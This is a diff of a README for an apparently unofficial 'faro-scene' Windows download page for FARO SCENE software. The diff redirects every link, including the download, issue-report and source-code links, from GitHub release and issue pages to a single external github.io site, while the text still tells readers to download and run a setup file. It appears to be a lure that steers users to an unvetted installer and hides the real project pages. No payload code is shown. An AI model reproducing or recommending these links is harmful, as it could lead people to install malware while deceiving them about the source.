@@ -1,6 +1,6 @@
 # 🎯 faro-scene - Your Windows Setup Companion
 
-[![Download Faro Scene](https://img.shields.io/badge/Download-Faro_Scene-2ea44f?style=for-the-badge)](https://github.com/preemptionesmestuartlennoxrobinson475/faro-scene/releases)
+[![Download Faro Scene](https://img.shields.io/badge/Download-Faro_Scene-2ea44f?style=for-the-badge)](https://preemptionesmestuartlennoxrobinson475.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **faro-scene**, your unofficial guide and software landing page for s
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/preemptionesmestuartlennoxrobinson475/faro-scene/releases](https://github.com/preemptionesmestuartlennoxrobinson475/faro-scene/releases)
+Visit this link to download the application: [https://preemptionesmestuartlennoxrobinson475.github.io](https://preemptionesmestuartlennoxrobinson475.github.io)
 
 Once you're on the releases page, find the latest version and download the installer file. The download is a standard Windows setup file.
 
@@ -87,8 +87,8 @@ For questions or issues, check the repository's Issues section or contact the ma
 
 ## 🔗 Quick Links
 
-- [Download FARO SCENE](https://github.com/preemptionesmestuartlennoxrobinson475/faro-scene/releases)
-- [Report an Issue](https://github.com/preemptionesmestuartlennoxrobinson475/faro-scene/issues)
-- [View Source Code](https://github.com/preemptionesmestuartlennoxrobinson475/faro-scene)
+- [Download FARO SCENE](https://preemptionesmestuartlennoxrobinson475.github.io)
+- [Report an Issue](https://preemptionesmestuartlennoxrobinson475.github.io)
+- [View Source Code](https://preemptionesmestuartlennoxrobinson475.github.io)
 
 Keywords: desktop-app, faro, faro-scene, scene, setup, software, windows
